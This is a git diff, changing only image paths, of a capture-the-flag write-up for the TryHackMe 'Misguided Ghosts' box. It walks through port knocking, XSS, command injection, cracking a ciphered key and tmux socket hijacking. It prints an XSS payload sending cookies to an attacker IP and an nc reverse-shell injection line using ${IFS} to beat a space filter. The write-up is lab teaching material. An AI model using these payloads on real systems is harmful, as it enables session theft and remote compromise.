@@ -115,7 +115,7 @@ Three files are inside of a public share on FTP, two of which are text files con
 ## Port Knocking
 Also, the jokes file caught my attention as we're dealing with networking material and knock knock jokes seemed a bit out of place. Then it hit me, we are probably supposed to be looking through the network traffic in order to find a port knock sequence. This made plenty of sense to me as there is nothing else on FTP for us and SSH logins will be encrypted with TLS/SSL.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/1.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/1.png)
 
 If you didn't know, port knocking is a security technique where a client would send a specific sequence of connection attempts to closed ports to signal a server to temporarily open a protected service port. This concept was more popular in the early 2000's, and was used as a lightweight way to hide services like SSH from unsolicited scans and attacks.
 
@@ -131,7 +131,7 @@ ip.addr == 192.168.236.131
 
 Filtering the pcap by that source IP will give us a series of SYN packets sent from an unknown client, as well as responses from the server forcing the handshake to reset.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/2.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/2.png)
 
 Since it's already in chronological order, we can see that the ports the server responds from will be our knock order. In our case, it is **7864 -> 8273 -> 9241 -> 12007 -> 60753**. I decided to create a quick Python script to send connection attempts to the gathered ports:
 
@@ -156,16 +156,16 @@ for port in ports:
 
 You can also use tools like [knockd](https://linux.die.net/man/1/knockd) or others available on GitHub for this step. After letting that run, I scan the network again with Nmap to find a new service on port 8080.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/3.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/3.png)
 
 ## Hidden Web Server
 Attempting to reach the page shows a connection reset error, but upon further inspection the port is using SSL so we must use HTTPS to connect on our browser. I view the certificate for some extra information and find an email for a user named zac who is listed as the Issuer.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/4.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/4.png)
 
 The actual webpage doesn't offer much besides a photo of Paramore's lead singer, Hayley (also what the box is named after).
 
-![](../assets/img/2026-02-01-MisguidedGhosts/5.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/5.png)
 
 I fire up Gobuster to find any subdirectories on the site we can move to exploit. 
 
@@ -193,16 +193,16 @@ Starting gobuster in directory enumeration mode
 
 This returns a few interesting hits, the first being a interactive console page that allows for Python expressions to be ran remotely, however it is PIN protected so I move on for now. It's a bit hard to see but the warning shows that this page discloses that the site is utilizing Werkzeug as its uWSGI; that's great info as now we know to exploit Python payloads in the coming steps.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/6.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/6.png)
 
 Next is a login page for members apart of the misguided ghosts club. I didn't have much to go off of so I tried a few attempts with Hayley and Zac with the password being the username reused and get a successful login as Zac. This site looks to be used to post about the band Paramore and anything regarding the group in general. 
 
-![](../assets/img/2026-02-01-MisguidedGhosts/7.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/7.png)
 
 ## Cross-Site Scripting
 It allows for users to post to the landing page in order for others to see. The message also notes that an admin will check every so often to moderate content on the site. I also discover that the server gives us a login cookie with the `HttpOnly` option set to false.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/8.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/8.png)
 
 It would be huge if this site was vulnerable to XSS as that would allow us to steal the administrator's cookie and login as them. Next, I use a few payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) meant to bypass filters along with an HTTP server on my attacking machine and find that this site is absolutely vulnerable session hijacking.
 
@@ -210,7 +210,7 @@ It would be huge if this site was vulnerable to XSS as that would allow us to st
 &lt;sscriptcript&gt;var i = new Image(); i.src = "http://192.168.144.73/" + document.cookie;&lt;/sscriptcript&gt;
 ```
 
-![](../assets/img/2026-02-01-MisguidedGhosts/9.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/9.png)
 
 Initial Foothold
 Using that admin cookie, we can now fuzz for more directories, hopefully containing functions for us to exploit.
@@ -241,11 +241,11 @@ Starting gobuster in directory enumeration mode
 
 I discover the `/photos` endpoint, which allows for file uploads to the website. Checking to see if a safe file is allowed for any filters in place returns a strange error that it cannot be found. It looks like this upload function is used to pull files from the web server and put them into a photos directory that the site will grab from.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/10.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/10.png)
 
 We can see that the file we attempted to upload is reflected in the URL via the image parameter. I test for an LFI vulnerability by suppyling `/etc/passwd` with directory traversal characters but it just outputs the same string. Next I tried just using a period, in hopes that the function would resolve the output to everything within the current working directory. This works and I get a list of files on the web server.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/11.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/11.png)
 
 Appending a semicolon with a simple command like whoami confirms that we actually have RCE on the box and that the server is running as root user. Also, the existence of a Dockerfile almost certainly means the site is hosted in a Docker container. 
 
@@ -261,12 +261,12 @@ Judging by the stdout being printed, the server is filtering spaces in the image
 image=.;nc${IFS}ATTACKER_IP${IFS}PORT${IFS}-e${IFS}/bin/sh
 ```
 
-![](../assets/img/2026-02-01-MisguidedGhosts/12.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/12.png)
 
 ## Docker Escape
 Now that we have a shell on the box, it's time to escape the docker container. A bit of internal enumeration shows a few very sensitive files inside a notes folder in Zac's home directory. The first is an RSA private key to login on the box via SSH, and the other is a message denoting that they have ciphered the file using a key (most likely using a Vigenère cipher).
 
-![](../assets/img/2026-02-01-MisguidedGhosts/13.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/13.png)
 
 I copy/paste this key to my attacking machine to make it easier to decipher. It is possible to reverse this by brute forcing the key if we know a piece of the plaintext already. A bit of research shows that luckily RSA key files all begin with the string 'MII'.
 
@@ -342,7 +342,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![](../assets/img/2026-02-01-MisguidedGhosts/14.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/14.png)
 
 This rewards us with the key that was used to cipher the RSA key file. We can throw the entire thing into Cyberchef to decode is using their built-in function. Finally, we can replace the original file with our plaintext one (apart from the header and footer) to login via Zac's account on SSH.
 
@@ -351,7 +351,7 @@ Now we can start finding routes to escalate privileges to root. Hayley is anothe
 
 While checking the running services, I notice an SMB instance running on localhost ports 139/445.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/15.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/15.png)
 
 I port forward this using SSH and connect using smbclient to read files on any available.
 
@@ -359,24 +359,24 @@ I port forward this using SSH and connect using smbclient to read files on any a
 sudo ssh -i id_rsa -L 445:localhost:445 zac@MACHINE_IP
 ```
 
-![](../assets/img/2026-02-01-MisguidedGhosts/16.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/16.png)
 
 Inside is a local share containing a file with backup passwords for services running on the host. Maybe one of these will work for Hayley's or Root's account.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/17.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/17.png)
 
 Bingo! Now let's login and restart enumeration to grab root privileges. We can also grab the user flag under her home directory at this point.
 
 Checking Sudo permissions for her account shows that she has the ability to run `/usr/sbin/visudo` as root user, however this was just a way to restart the SSH daemon. After a lot of time sunk and plenty of digging, I discover a process running as root user that seemed a bit strange.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/18.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/18.png)
 
 I figured a shell that's already running as root user would be a pretty easy target if not configured correctly. Checking the permissions on that .details socket shows that everyone in the paramore group has the ability to read/write to it.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/19.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/19.png)
 
 This means that we can simply use the tmux binary while specifying the socket to hijack the root shell and grab full privileges over the machine.[This](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) is a great article explaining the ins and outs of this process.
 
-![](../assets/img/2026-02-01-MisguidedGhosts/20.png)
+![](/assets/img/2026-02-01-MisguidedGhosts/20.png)
 
 That's all y'all, this box was very fun as every step was unique and isn't often seen in challenges like these. Huge thanks to [jakeyee](https://tryhackme.com/p/jakeyee) and [blobloblaw](https://tryhackme.com/p/bobloblaw) for creating such a cool box. I hope this was helpful to anyone following along or stuck and happy hacking!
